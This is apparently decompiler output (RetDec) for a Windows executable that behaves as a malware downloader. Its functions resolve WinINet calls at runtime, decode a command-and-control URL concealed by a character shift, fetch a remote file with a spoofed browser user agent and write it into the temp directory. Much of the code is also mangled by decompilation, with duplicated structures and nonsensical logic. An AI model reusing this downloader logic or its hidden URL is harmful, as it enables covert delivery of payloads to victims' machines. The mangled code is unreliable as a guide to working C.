//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com
// Copyright (c) Retargetable Decompiler <info@retdec.com>
//

#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <windows.h>

// ------------------------ Structures ------------------------

struct _EXCEPTION_POINTERS {
    struct _EXCEPTION_RECORD * e0;
    struct _CONTEXT * e1;
};

struct _EXCEPTION_RECORD {
    int32_t e0;
    int32_t e1;
    struct _EXCEPTION_RECORD * e2;
    int32_t * e3;
    int32_t e4;
    int32_t e5[1];
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _LIST_ENTRY {
    struct _LIST_ENTRY * e0;
    struct _LIST_ENTRY * e1;
};

struct _M128A {
    int32_t e0;
    int64_t e1;
};

struct _CONTEXT {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int16_t e8;
    int16_t e9;
    int16_t e10;
    int16_t e11;
    int16_t e12;
    int16_t e13;
    int32_t e14;
    int32_t e15;
    int32_t e16;
    int32_t e17;
    int32_t e18;
    int32_t e19;
    int32_t e20;
    int32_t e21;
    int32_t e22;
    int32_t e23;
    int32_t e24;
    int32_t e25;
    int32_t e26;
    int32_t e27;
    int32_t e28;
    int32_t e29;
    int32_t e30;
    int32_t e31;
    int32_t e32;
    int32_t e33;
    int32_t e34;
    int32_t e35;
    int32_t e36;
    int32_t e37;
    int32_t e38;
    struct _M128A e39[26];
    int32_t e40;
    int32_t e41;
    int32_t e42;
    int32_t e43;
    int32_t e44;
    int32_t e45;
};

struct _OVERLAPPED {
    int32_t e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
};

struct _RTL_CRITICAL_SECTION {
    struct _RTL_CRITICAL_SECTION_DEBUG * e0;
    int32_t e1;
    int32_t e2;
    int32_t * e3;
    int32_t * e4;
    int32_t e5;
};

struct _RTL_CRITICAL_SECTION_DEBUG {
    int16_t e0;
    int16_t e1;
    struct _RTL_CRITICAL_SECTION * e2;
    struct _LIST_ENTRY e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int16_t e7;
    int16_t e8;
};

struct _SECURITY_ATTRIBUTES {
    int32_t e0;
    int32_t * e1;
    bool e2;
};

struct _STARTUPINFOA {
    int32_t e0;
    char * e1;
    char * e2;
    char * e3;
    int32_t e4;
    int32_t e5;
    int32_t e6;
    int32_t e7;
    int32_t e8;
    int32_t e9;
    int32_t e10;
    int32_t e11;
    int16_t e12;
    int16_t e13;
    char * e14;
    int32_t * e15;
    int32_t * e16;
    int32_t * e17;
};

struct _SYSTEMTIME {
    int16_t e0;
    int16_t e1;
    int16_t e2;
    int16_t e3;
    int16_t e4;
    int16_t e5;
    int16_t e6;
    int16_t e7;
};

struct _TIME_ZONE_INFORMATION {
    int32_t e0;
    int16_t e1[32];
    struct _SYSTEMTIME e2;
    int32_t e3;
    int16_t e4[32];
    struct _SYSTEMTIME e5;
    int32_t e6;
};

struct _cpinfo {
    int32_t e0;
    char e1[1];
    char e2[1];
};

// ------------------- Function Prototypes --------------------

int32_t ___crtCompareStringA(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t __callnewh(int32_t a1);
int32_t __FF_MSGBANNER(void);
int32_t __heap_alloc(uint32_t a1);
int32_t __NMSG_WRITE(int32_t a1);
void _RtlUnwind_40_16(int32_t * TargetFrame, int32_t * TargetIp, struct _EXCEPTION_RECORD * ExceptionRecord, int32_t * ReturnValue);
int32_t entry_point(int32_t a1);
int32_t function_287ea97(void);
int32_t function_401000(char * a1, int32_t * a2);
int32_t function_401050(int32_t * lpFileName);
int32_t function_4013c0(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4018b0(char * a1);
int32_t function_401900(int32_t result);
int32_t function_40192f(int32_t a1);
int32_t function_401960(int32_t a1);
int32_t function_4019ac(int32_t * a1, int32_t a2, int32_t a3);
int32_t function_401a0e(int32_t a1, int32_t a2, int32_t a3);
int32_t function_401a3f(int32_t * a1, char * a2);
int32_t function_401a52(int32_t * a1, char * a2);
int32_t function_401aa4(int32_t a1);
int32_t function_401ab1(void);
int32_t function_401ad3(int32_t a1);
int32_t function_401cc4(int32_t a1);
int32_t function_401ce7(void);
int32_t function_401ce8(void);
int32_t function_401d90(void);
int32_t function_401da4(uint32_t a1, int32_t a2, int32_t a3);
int32_t function_401dd3(int32_t a1, int32_t a2);
int32_t function_401df6(uint32_t a1);
int32_t function_401e25(int32_t a1, int32_t a2);
int32_t function_401e48(int32_t a1);
int32_t function_401ed5(int32_t a1, int32_t a2);
int32_t function_401eff(int32_t a1, int32_t a2, int32_t * a3);
int32_t function_402640(int32_t a1, int32_t a2, int32_t result);
int32_t function_402675(int32_t result, int32_t a2);
int32_t function_4026a6(int32_t a1, int32_t result, int32_t a3);
int32_t function_4026de(int32_t a1);
int32_t function_4026eb(int32_t a1);
int32_t function_4026fb(int32_t a1);
int32_t function_402709(int32_t lpMem);
int32_t function_402751(uint32_t a1);
int32_t function_4027ae(int32_t a1);
int32_t function_402831(int32_t a1);
int32_t function_40285c(int32_t a1);
int32_t function_40288a(int32_t a1, int32_t a2);
int32_t function_4028e6(void);
int32_t function_4028ef(int32_t a1);
int32_t function_402993(int32_t a1);
int32_t function_402a6f(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_402bdf(int32_t a1);
int32_t function_402ca7(int32_t a1, int32_t * a2);
int32_t function_402dbf(void);
int32_t function_402e13(int32_t result);
int32_t function_402e26(void);
int32_t function_402e8d(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_402f4f(void);
int32_t function_402f7c(int32_t a1);
int32_t function_402f8d(int32_t a1);
int32_t function_402f9e(int32_t a1, int32_t a2, int32_t a3);
int32_t function_403041(int32_t a1);
int32_t function_403043(int32_t a1);
int32_t function_40304c(void);
int32_t function_403055(int32_t * a1, int32_t * a2);
int32_t function_40306f(int32_t a1, int32_t ExceptionInfo);
int32_t function_4031ad(int32_t a1, int32_t a2);
int32_t function_4031e7(void);
int32_t function_4032a0(void);
int32_t function_403339(int32_t a1, int32_t a2, int32_t a3, int32_t * a4, int32_t * a5);
int32_t function_4034ed(void);
int32_t function_40361f(int32_t a1);
int32_t function_4037db(int32_t a1);
int32_t function_4038e5(void);
int32_t function_403908(int32_t a1, int32_t a2, int32_t a3);
int32_t function_403b74(int32_t a1, int32_t a2);
int32_t function_403c01(void);
int32_t function_403c82(int32_t a1);
int32_t function_403cab(int32_t a1);
int32_t function_403d0c(int32_t a1);
int32_t function_403dad(uint32_t a1, int32_t a2);
int32_t function_403de0(int32_t a1);
int32_t function_403e5b(int32_t a1, int32_t a2);
int32_t function_403eb4(int32_t lpMultiByteStr, int32_t a2);
int32_t function_404005(void);
int32_t function_404043(int32_t a1);
int32_t function_40406e(int32_t a1, int32_t a2);
int32_t function_404399(int32_t a1);
int32_t function_4046a2(int32_t a1);
int32_t function_404753(int32_t a1);
int32_t function_40484e(int32_t a1, int32_t a2, int32_t a3);
int32_t function_404b44(int32_t a1);
int32_t function_404bb7(void);
int32_t function_404bc0(void);
int32_t function_404bc9(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, char a10, int32_t a11);
int32_t function_404cec(uint32_t a1, int32_t hHandle);
int32_t function_404d68(uint32_t a1);
int32_t function_404de7(uint32_t a1);
int32_t function_404e29(int32_t a1);
int32_t function_404e88(int32_t a1);
int32_t function_404eaa(int32_t a1);
int32_t function_404f3d(uint32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_404fa2(int32_t a1, int32_t lpBuffer, uint32_t nNumberOfBytesToWrite);
int32_t function_40512d(uint32_t a1, int32_t a2, int32_t a3);
int32_t function_405192(int32_t a1, int32_t a2, int32_t a3);
int32_t function_40536b(int32_t a1);
int32_t function_4053af(int32_t lpFileName, uint32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_40567e(uint32_t a1, int32_t a2, int32_t a3, int32_t a4);
int32_t function_4056e3(int32_t a1, int32_t lDistanceToMove, int32_t dwMoveMethod);
int32_t function_405756(int32_t a1, int32_t a2, int32_t a3);
int32_t function_405784(void);
int32_t function_405a0b(int32_t * a1);
int32_t function_405a2c(int32_t a1);
int32_t function_405bd8(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9, int32_t a10, int32_t a11);
int32_t function_405d20(int32_t a1);
int32_t function_405d30(int32_t * a1, int32_t a2);
int32_t function_405d91(int32_t a1, int32_t result, int32_t a3);
int32_t function_405e10(int32_t a1);
int32_t function_405fbd(int32_t result);
int32_t function_406007(int32_t a1);
int32_t function_40603a(void);
int32_t function_406063(void);
int32_t function_4061e8(int32_t a1, int32_t a2, int32_t a3);
int32_t function_406210(int32_t result5, uint32_t a2, uint32_t a3);
int32_t function_406545(int32_t * a1, char * a2, int32_t a3);
int32_t function_4065d0(int32_t result, char * a2, int32_t a3);
int32_t function_4066d0(int32_t result, int32_t a2, int32_t a3);
int32_t function_406743(void);
int32_t function_406750(int32_t result5, uint32_t a2, uint32_t a3);
int32_t function_406a85(int32_t a1, int32_t a2);
int32_t function_406baa(int32_t a1);
int32_t function_406c40(int32_t a1, int32_t a2);
int32_t function_406cc4(char * a1);
int32_t function_406d41(int32_t a1, int32_t a2, char * a3, int32_t a4, int32_t * a5, int32_t a6, int32_t a7, int32_t a8, int32_t a9);
int32_t function_406f65(int32_t a1, int32_t result);
int32_t function_406f90(int32_t a1, char * a2, int32_t a3, int32_t * a4, int32_t a5, int32_t a6, int32_t a7);
int32_t function_4070e0(int32_t a1, int32_t a2);
int32_t function_407120(int32_t a1, int32_t a2, int32_t a3);
int32_t function_407160(int32_t a1, int32_t a2);
int32_t function_40719a(int32_t a1, int32_t a2);
int32_t function_4071fb(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4072e3(void);
int32_t function_407360(int32_t a1, int32_t a2);
int32_t function_407430(int32_t a1, int32_t a2, int32_t a3);
int32_t function_4077ae(int32_t a1, int32_t a2);
int32_t function_407935(int32_t a1);
int32_t function_40798d(int32_t a1);
int32_t function_4079f4(int32_t result, int32_t a2, int32_t a3);
int32_t function_407abf(int32_t a1, int32_t a2);
int32_t function_407bf7(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5, int32_t a6, int32_t a7, int32_t a8);
int32_t function_407c8e(int32_t a1);
int32_t function_407cc0(int32_t a1);
int32_t function_407cd0(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5);
int32_t function_f9c3b859(void);

// --------------------- Global Variables ---------------------

int32_t g1 = 0x6000006; // 0x408114
char * g2; // 0x4084f8
int16_t * g3 = NULL; // 0x4084fc
int32_t g4 = 0; // 0x409000
int32_t g5 = 0; // 0x409004
int32_t g6 = 0; // 0x409008
int32_t g7 = 0; // 0x409014
int32_t g8 = 0; // 0x409018
int32_t g9 = 0; // 0x409020
int32_t g10 = 0; // 0x409024
int32_t g11 = 0; // 0x409028
int32_t g12 = 63; // 0x4092f8
int32_t g13 = 1; // 0x409354
int32_t g15 = 0; // 0x409368
int32_t g16 = 0; // 0x409378
int32_t g17 = 0; // 0x409398
bool g18 = false; // 0x4093c8
bool g19 = false; // 0x4095b8
char * g20[2] = {
    "(null)",
    (char *)L"(null)"
}; // 0x4095d8
int16_t (*g21)[7] = L"(null)"; // 0x4095dc
int32_t g22 = -1; // 0x4095e0
int32_t g23 = -0x3ffffffb; // 0x4095e8
int32_t g24 = 3; // 0x409660
int32_t g25 = 7; // 0x409664
int32_t g26 = 10; // 0x40966c
int32_t g27 = -1; // 0x409670
int32_t g28 = 2; // 0x4096a8
char (*g29)[37] = "R6002\r\n- floating point not loaded\r\n"; // 0x4096ac
int32_t g30 = 0; // 0x409738
int32_t g35; // 0x409818
int32_t g36 = 1016; // 0x409a30
int32_t g37 = 1; // 0x409a38
int32_t g38 = 22; // 0x409a3c
bool g39 = false; // 0x409ba0
int32_t g40 = 1; // 0x409ba4
int32_t g41 = -3600; // 0x409ba8
char * g42[2] = {
    "PST",
    "PDT"
}; // 0x409c2c
char g43 = 0; // 0x409c2f
char (*g44)[4] = "PDT"; // 0x409c30
char g45 = 0; // 0x409c33
int32_t g46 = -1; // 0x409c38
int32_t g47 = 0; // 0x409c3c
int32_t g48 = 0; // 0x409c40
int32_t g49 = -1; // 0x409c48
int32_t g50 = 0; // 0x409c4c
int32_t g51 = 0; // 0x409c50
int32_t g52 = -1; // 0x409c54
char g53 = 0; // 0x409c6b
char g54 = 0; // 0x409c6f
int32_t g55 = 365; // 0x409c84
int32_t g56 = -1; // 0x409c88
char * g57 = "\x01\x02\x04\b"; // 0x409cc0
int32_t g58 = 932; // 0x409cc8
int32_t g59 = -0x7d867da0; // 0x409ccc
char * g60 = "\xa6\xdf"; // 0x409cd8
bool g61 = false; // 0x409db8
int32_t g62 = 1; // 0x409ecc
int32_t g63 = 0; // 0x409fe0
int32_t g64 = 0; // 0x409fe4
int32_t g65 = 0; // 0x409fe8
int32_t g66 = 0; // 0x409fec
int32_t g67 = 0; // 0x409ff4
int32_t g68 = 0; // 0x409ff8
int32_t g69 = 0; // 0x40a000
int32_t g70 = 0; // 0x40a008
int16_t g71 = 0; // 0x40a00a
int16_t g72 = 0; // 0x40a00e
int16_t g73 = 0; // 0x40a010
int16_t g74 = 0; // 0x40a012
char * g75; // 0x40a018
int32_t g76 = 0; // 0x40a020
int32_t g77 = 0; // 0x40a024
int32_t g78 = 0; // 0x40a028
int32_t g79 = 0; // 0x40a030
uint32_t g80 = 0; // 0x40a034
int32_t g81 = 0; // 0x40a038
int32_t g82 = 0; // 0x40a03c
int32_t g83 = 0; // 0x40a040
int32_t g84 = 0; // 0x40a044
int32_t g85 = 0; // 0x40a048
int32_t g86 = 0; // 0x40a050
int32_t g87 = 0; // 0x40a054
int32_t g88 = 0; // 0x40a058
char * g89; // 0x40a060
char g90 = 0; // 0x40a068
int32_t g91 = 0; // 0x40a06c
int32_t g92 = 0; // 0x40a070
char * g93; // 0x40a074
int32_t g94 = 0; // 0x40a178
int32_t g95 = 0; // 0x40a180
int32_t g96 = 0; // 0x40a198
int32_t g97 = 0; // 0x40a1b0
int32_t g98 = 0; // 0x40a1c8
int32_t g99 = 0; // 0x40a1e0
int32_t g100 = 0; // 0x40a1e8
int64_t g101 = 0; // 0x40a1f0
int16_t * g102 = NULL; // 0x40a1f4
int16_t g103 = 0; // 0x40a234
int16_t g104 = 0; // 0x40a236
int16_t g105 = 0; // 0x40a238
int16_t g106 = 0; // 0x40a23a
int16_t g107 = 0; // 0x40a23c
int16_t g108 = 0; // 0x40a23e
int16_t g109 = 0; // 0x40a240
int16_t g110 = 0; // 0x40a242
int64_t g111 = 0; // 0x40a244
int16_t * g112 = NULL; // 0x40a248
int16_t g113 = 0; // 0x40a288
int16_t g114 = 0; // 0x40a28a
int16_t g115 = 0; // 0x40a28c
int16_t g116 = 0; // 0x40a28e
int16_t g117 = 0; // 0x40a290
int16_t g118 = 0; // 0x40a292
int16_t g119 = 0; // 0x40a294
int16_t g120 = 0; // 0x40a296
int32_t g121 = 0; // 0x40a298
int32_t g122 = 0; // 0x40a29c
int32_t g123 = 0; // 0x40a2a0
int32_t g124 = 0; // 0x40a2a4
int32_t g125 = 0; // 0x40a2a8
int32_t g126 = 0; // 0x40a2ac
int32_t g127 = 0; // 0x40a2b0
int32_t g128 = 0; // 0x40a2b4
int32_t g129 = 0; // 0x40a2b8
int32_t g130 = 0; // 0x40a2c8
int32_t g131 = 0; // 0x40a2d0
int32_t g132 = 0; // 0x40a2e0
int32_t g133 = 0; // 0x40a2e8
int32_t g134 = 0; // 0x40a2ec
int32_t g135 = 0; // 0x40a2f0
int32_t g136 = 0; // 0x40a368
int32_t g137 = 0; // 0x40a374
int32_t g138 = 0; // 0x40a378
int32_t g139 = 0; // 0x40a37c
int32_t g140 = 0; // 0x40a380
int32_t g141 = 0; // 0x40a38c
char * g142; // 0x40a3a0
char * g143; // 0x40a4a0
char * g144; // 0x40a4a1
int32_t g145 = 0; // 0x40a5a4
int32_t g146 = 0; // 0x40a5a8
int32_t g147 = 0; // 0x40a5ac
int32_t g148 = 0; // 0x40a5b0
int32_t g149 = 0; // 0x40a5b4
int32_t g150 = 0; // 0x40a5b8
int32_t g151 = 0; // 0x40a5bc
int32_t g152 = 0; // 0x40a5c0
int32_t g153 = 0; // 0x40a5e0
int32_t g154 = 0; // 0x40a5e4
bool g155 = false; // 0x40a6e0
int32_t g156 = 0; // 0x40a6e4
int32_t g157 = 0; // 0x40a6e8
int32_t g158 = 0; // 0x40a6ec
int32_t g159 = 0; // 0x40a6f0
int32_t g160 = 0; // 0x40a6f8
int32_t g161 = 0; // 0x40a700
int32_t g162 = 0; // 0x40b700
char * g163; // 0x40b704
int32_t g164;
int32_t g165;
int32_t g166;
int32_t g167;
int32_t g168;
int32_t g169;
int32_t g170;
int32_t g171;
int32_t g172;
int32_t g173;
int32_t g174;
int32_t g175;
int32_t * g14 = &g161; // 0x409358
int32_t * g31 = &g95; // 0x40973c
int32_t * g32 = &g97; // 0x40975c
int32_t * g33 = &g98; // 0x40976c
int32_t * g34 = &g96; // 0x40977c

// ------------------------ Functions -------------------------

// Address range: 0x401000 - 0x401050
int32_t function_401000(char * a1, int32_t * a2) {
    int32_t v1 = (int32_t)a2;
    int32_t v2 = (int32_t)a1;
    bool v3; // 0x401000
    int32_t v4 = v3 ? -1 : 1;
    int32_t v5 = -1; // 0x401010
    int32_t v6 = v2; // 0x401010
    while (v5 != 0) {
        int32_t v7 = v6;
        v5--;
        v6 = v7 + v4;
        if (*(char *)v7 == 0) {
            if (v5 == -2) {
                return function_4018b0("%s\n");
            } else {
                goto lab_0x401017;
            }
        }
    }
    goto lab_0x401017;
  lab_0x401017:;
    int32_t v8 = v1;
    int32_t v9 = 1; // 0x401027
    *(char *)v8 = *(char *)(v2 - v1 + v8) - 1;
    int32_t v10 = v2; // 0x401030
    int32_t v11 = -1;
    int32_t v12 = 0; // 0x401030
    int32_t v13; // 0x401000
    int32_t v14; // 0x401030
    while (v11 != 0) {
        v13 = v10;
        v14 = v11 - 1;
        v10 = v13 + v4;
        v12 = v14;
        if (*(char *)v13 == 0) {
            // break ->
            break;
        }
        v11 = v14;
        v12 = 0;
    }
    int32_t v15 = v8 + 1; // 0x401037
    int32_t v16 = v9; // 0x401037
    while (v9 < -2 - v12) {
        // 0x401020
        v8 = v15;
        v9 = v16 + 1;
        *(char *)v8 = *(char *)(v2 - v1 + v8) - 1;
        v10 = v2;
        v11 = -1;
        v12 = 0;
        while (v11 != 0) {
            v13 = v10;
            v14 = v11 - 1;
            v10 = v13 + v4;
            v12 = v14;
            if (*(char *)v13 == 0) {
                // break ->
                break;
            }
            v11 = v14;
            v12 = 0;
        }
        v15 = v8 + 1;
        v16 = v9;
    }
  lab_0x40103a:
    // 0x40103a
    return function_4018b0("%s\n");
}

// Address range: 0x401050 - 0x4013bd
int32_t function_401050(int32_t * lpFileName) {
    // 0x401050
    function_401900((int32_t)&g167);
    int32_t * moduleHandle = LoadLibraryA("winInet.dll"); // 0x401063
    int32_t (*func)() = GetProcAddress(moduleHandle, "InternetOpenA"); // 0x401077
    g68 = (int32_t)func;
    if (func == NULL) {
        // 0x401082
        function_4018b0("GetProcessAddresss of InternetOpenA Failed!\n");
        return 0;
    }
    int32_t (*func2)() = GetProcAddress(moduleHandle, "InternetCloseHandle"); // 0x4010db
    g64 = (int32_t)func2;
    if (func2 == NULL) {
        // 0x4010e6
        function_4018b0("GetProcessAddresss of pInternetCloseHandle Failed!\n");
        return 0;
    }
    int32_t (*func3)() = GetProcAddress(moduleHandle, "InternetOpenUrlA"); // 0x401106
    g63 = (int32_t)func3;
    if (func3 == NULL) {
        // 0x401114
        function_4018b0("GetProcessAddresss of pInternetOpenUrlA Failed!\n");
        return 0;
    }
    int32_t (*func4)() = GetProcAddress(moduleHandle, "HttpQueryInfoA"); // 0x40118b
    g66 = (int32_t)func4;
    if (func4 == NULL) {
        // 0x401196
        function_4018b0("GetProcessAddresss of pHttpQueryInfoA Failed!\n");
        return 0;
    }
    // 0x4011d8
    function_4018b0("szFileUrl=%s\tstatus=%u\n");
    if ((int32_t)"Mozilla/4.0 (compatible; MSIE 6.0; Win32)" == 404 || (int32_t)"Mozilla/4.0 (compatible; MSIE 6.0; Win32)" == 403) {
        // 0x401251
        return -1;
    }
    // 0x4011fd
    function_4018b0("Avaliable data:%u bytes\n");
    int32_t * fileHandle = CreateFileA((char *)lpFileName, 0x40000000, 0, NULL, 2, 128, NULL); // 0x401288
    int32_t v1 = (int32_t)fileHandle; // 0x401288
    if (fileHandle == (int32_t *)-1) {
        // 0x401295
        return function_4018b0("Create file failed\n") | v1;
    }
    int32_t (*func5)() = GetProcAddress(moduleHandle, "InternetReadFile"); // 0x4012b5
    g65 = (int32_t)func5;
    if (func5 == NULL) {
        // 0x4012c0
        function_4018b0("GetProcessAddresss of pInternetReadFile Failed!\n");
        return 0;
    }
    // 0x4012da
    Sleep(100);
    int32_t v2 = (int32_t)"Mozilla/4.0 (compatible; MSIE 6.0; Win32)"; // bp-192, 0x4012fb
    int32_t v3 = &v2;
    int32_t v4 = *(int32_t *)(v3 + 24); // 0x40130c
    int32_t v5 = 0; // 0x401312
    int32_t v6 = v3; // 0x401312
    if (v4 != 0) {
        // 0x401314
        *(int32_t *)(v3 - 4) = 0;
        *(int32_t *)(v3 - 8) = v3 + 44;
        *(int32_t *)(v3 - 12) = v4;
        *(int32_t *)(v3 - 16) = v3 + 48;
        v6 = v3 - 20;
        *(int32_t *)v6 = v1;
        if (!WriteFile(&g167, &g167, (int32_t)&g167, &g167, (struct _OVERLAPPED *)&g167)) {
            // 0x401376
            *(int32_t *)(v3 - 24) = v1;
            CloseHandle(&g167);
            return 0;
        }
        // 0x401328
        v5 = *(int32_t *)(v3 + 4);
    }
    int32_t v7 = v6;
    int32_t v8 = v7 + 20; // 0x40132c
    int32_t * v9 = (int32_t *)v8; // 0x40132c
    int32_t v10 = *v9 - v5; // 0x401330
    *v9 = v10;
    int32_t * v11 = (int32_t *)(v7 - 4);
    while (v10 != 0) {
        // 0x401338
        *v11 = 100;
        Sleep((int32_t)&g167);
        *(int32_t *)(v7 - 8) = v8;
        *(int32_t *)(v7 - 12) = 0x10000;
        *(int32_t *)(v7 - 16) = v7 + 44;
        int32_t v12 = v7 - 20; // 0x40134b
        *(int32_t *)v12 = (int32_t)"Mozilla/4.0 (compatible; MSIE 6.0; Win32)";
        v3 = v12;
        v4 = *(int32_t *)(v3 + 24);
        v5 = 0;
        v6 = v3;
        if (v4 != 0) {
            // 0x401314
            *(int32_t *)(v3 - 4) = 0;
            *(int32_t *)(v3 - 8) = v3 + 44;
            *(int32_t *)(v3 - 12) = v4;
            *(int32_t *)(v3 - 16) = v3 + 48;
            v6 = v3 - 20;
            *(int32_t *)v6 = v1;
            if (!WriteFile(&g167, &g167, (int32_t)&g167, &g167, (struct _OVERLAPPED *)&g167)) {
                // 0x401376
                *(int32_t *)(v3 - 24) = v1;
                CloseHandle(&g167);
                return 0;
            }
            // 0x401328
            v5 = *(int32_t *)(v3 + 4);
        }
        // 0x40132c
        v7 = v6;
        v8 = v7 + 20;
        v9 = (int32_t *)v8;
        v10 = *v9 - v5;
        *v9 = v10;
        v11 = (int32_t *)(v7 - 4);
    }
    // 0x40138a
    *v11 = v1;
    CloseHandle(&g167);
    *(int32_t *)(v7 - 8) = *(int32_t *)(v7 + 12);
    *(int32_t *)(v7 - 12) = (int32_t)"Mozilla/4.0 (compatible; MSIE 6.0; Win32)";
    *(int32_t *)(v7 - 16) = (int32_t)"down file success\n";
    function_4018b0((char *)&g167);
    return 0;
}

// Address range: 0x4013c0 - 0x4018a7
int32_t function_4013c0(int32_t a1, int32_t a2, int32_t a3) {
    // 0x4013c0
    int32_t v1; // bp-383, 0x4013c0
    __asm_rep_stosd_memset((char *)&v1, 0, 31);
    bool v2; // 0x4013c0
    int32_t v3 = (v2 ? -124 : 124) + (int32_t)&v1; // 0x4013e0
    *(int16_t *)v3 = 0;
    *(char *)(v3 + (v2 ? -2 : 2)) = 0;
    int32_t lpSystemTime; // bp-400, 0x4013c0
    GetLocalTime((struct _SYSTEMTIME *)&lpSystemTime);
    int32_t v4; // bp-132, 0x4013c0
    __asm_rep_stosd_memset((char *)&v4, 0, 32);
    int32_t v5; // bp-532, 0x4013c0
    __asm_rep_stosd_memset((char *)&v5, 0, 32);
    int32_t v6; // bp-660, 0x4013c0
    __asm_rep_stosd_memset((char *)&v6, 0, 32);
    int32_t lpBuffer; // bp-260, 0x4013c0
    __asm_rep_stosd_memset((char *)&lpBuffer, 0, 32);
    int32_t v7 = 128; // bp-820, 0x401437
    GetTempPathA(128, (char *)&lpBuffer);
    int32_t v8; // bp-796, 0x4013c0
    __asm_rep_stosd_memset((char *)&v8, 0, 32);
    int32_t v9 = v2 ? -1 : 1;
    int32_t v10 = -1; // 0x40145d
    int32_t v11; // bp-268, 0x4013c0
    int32_t v12 = &v11;
    int32_t v13 = 0; // 0x40145d
    int32_t v14 = v12; // 0x40145d
    while (v10 != 0) {
        int32_t v15 = v12 + v9; // 0x40145d
        v10--;
        v13 = v10;
        v14 = v15;
        if (*(char *)v12 == 0) {
            // break ->
            break;
        }
        v12 = v15;
        v13 = 0;
        v14 = v12;
    }
    uint32_t v16 = -1 - v13;
    int32_t v17 = &v8; // 0x401467
    uint32_t v18 = v16 / 4; // 0x40146d
    __asm_rep_movsd_memcpy((char *)&v8, (char *)(v14 - v16), v18);
    int32_t v19 = v2 ? -4 : 4; // 0x401470
    char * v20 = (char *)(v18 * v19 + v17); // 0x40147a
    __asm_rep_movsb_memcpy(v20, v20, v16 & 3);
    int32_t v21 = -1; // 0x401484
    int32_t v22 = (int32_t)"index.asp";
    int32_t v23 = 0; // 0x401484
    int32_t v24 = v22; // 0x401484
    while (v21 != 0) {
        int32_t v25 = v22 + v9; // 0x401484
        v21--;
        v23 = v21;
        v24 = v25;
        if (*(char *)v22 == 0) {
            // break ->
            break;
        }
        v22 = v25;
        v23 = 0;
        v24 = v22;
    }
    uint32_t v26 = -1 - v23;
    int32_t v27 = -1; // 0x401493
    int32_t v28 = v17;
    int32_t v29 = v28; // 0x401493
    while (v27 != 0) {
        int32_t v30 = v28 + v9; // 0x401493
        v27--;
        v29 = v30;
        if (*(char *)v28 == 0) {
            // break ->
            break;
        }
        v28 = v30;
        v29 = v28;
    }
    int32_t v31 = v29 - 1; // 0x401497
    uint32_t v32 = v26 / 4; // 0x401498
    __asm_rep_movsd_memcpy((char *)v31, (char *)(v24 - v26), v32);
    char * v33 = (char *)(v31 + v32 * v19); // 0x4014a2
    __asm_rep_movsb_memcpy(v33, v33, v26 & 3);
    int32_t v34 = function_401ad3((int32_t)&g167); // 0x4014a4
    function_401aa4(v34);
    int32_t v35; // bp-396, 0x4013c0
    function_401000("iuuq;00bqqt/bozpggjdf/jogp0gjmft0yy40joefy/btq@", &v35);
    function_401ab1();
    function_401ab1();
    int32_t v36; // bp-540, 0x4013c0
    function_401a52(&v36, "%s%d%d");
    function_4018b0("%s\n");
    int32_t v37 = function_401050(&v36); // 0x401521
    int32_t v38 = &v7; // 0x401526
    int32_t v39 = v38; // 0x40152b
    if (v37 == 0) {
        int32_t v40 = function_401a3f(&v8, "rb"); // 0x40153b
        int32_t * v41; // 0x4013c0
        int32_t v42; // 0x4013c0
        int32_t v43; // bp-668, 0x4013c0
        if (function_4019ac(&v43, 128, v40) == 0) {
            // 0x401531
            v41 = (int32_t *)(v38 - 4);
            v39 = v38;
            v42 = v40;
        } else {
            int32_t v44 = 0;
            int32_t v45 = v38;
            int32_t v46 = v45 + 280; // 0x401571
            __asm_rep_stosd_memset((char *)v46, 0, 32);
            int32_t v47 = v45 + 152; // 0x40157a
            int32_t v48 = v47; // 0x401584
            int32_t v49 = -1;
            int32_t v50 = 0; // 0x401584
            int32_t v51; // 0x4013c0
            int32_t v52; // 0x401584
            while (v49 != 0) {
                v51 = v48;
                v52 = v49 - 1;
                v48 = v51 + v9;
                v50 = v52;
                if (*(char *)v51 == 0) {
                    // break ->
                    break;
                }
                v49 = v52;
                v50 = 0;
            }
            int32_t v53 = -3 - v50; // 0x40158b
            int32_t v54 = v53; // 0x40158c
            int32_t v55 = v53; // 0x40158c
            int32_t v56; // 0x4013c0
            char * v57; // 0x40158e
            char v58; // 0x40158e
            int32_t v59; // 0x4015af
            if (v53 >= 0) {
                v57 = (char *)(v54 + v47);
                v58 = *v57;
                if (v58 != 13 == (v58 != 10)) {
                    // 0x4015a5
                    if (v58 == 47) {
                        // break -> 0x4015b2
                        break;
                    }
                } else {
                    // 0x4015a5
                    *v57 = 0;
                }
                // 0x4015af
                v59 = v54 - 1;
                v55 = v59;
                while (v59 >= 0) {
                    // 0x40158e
                    v56 = v59;
                    v57 = (char *)(v56 + v47);
                    v58 = *v57;
                    if (v58 != 13 == (v58 != 10)) {
                        // 0x4015a5
                        v55 = v56;
                        if (v58 == 47) {
                            // break -> 0x4015b2
                            break;
                        }
                    } else {
                        // 0x4015a5
                        *v57 = 0;
                    }
                    // 0x4015af
                    v59 = v56 - 1;
                    v55 = v59;
                }
            }
            int32_t v60 = v45 + 24; // 0x4015b9
            char * v61 = (char *)v60; // 0x4015c1
            __asm_rep_stosd_memset(v61, 0, 32);
            int32_t v62 = v45 + 552;
            int32_t v63 = -1;
            int32_t v64 = 0; // 0x4015cd
